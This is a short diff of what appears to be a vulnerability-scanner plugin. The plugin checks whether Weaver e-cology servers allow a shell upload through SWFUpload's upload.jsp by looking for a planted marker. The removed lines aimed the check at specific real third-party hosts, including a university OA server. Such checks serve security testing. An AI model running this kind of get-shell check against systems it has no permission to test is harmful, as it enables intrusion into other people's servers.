@@ -33,8 +33,7 @@ Content-Type: application/octet-stream\r
     code, head, res, errcode, _ = curl.curl(verifyUrl)
     if code == 200 and "testvul..." in res:
         security_hole('weaver e-cology get shell ' + arg + 'tools/SWFUpload/upload.jsp')
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('weaver_oa', 'http://oa.yangtzeu.edu.cn/')[1])
-    #audit(assign('weaver_e-cology', 'http://oa.cncie.com/')[1])
-    #audit(assign('weaver_e-cology', 'http://oaf.yitoa.com:6688/')[1])
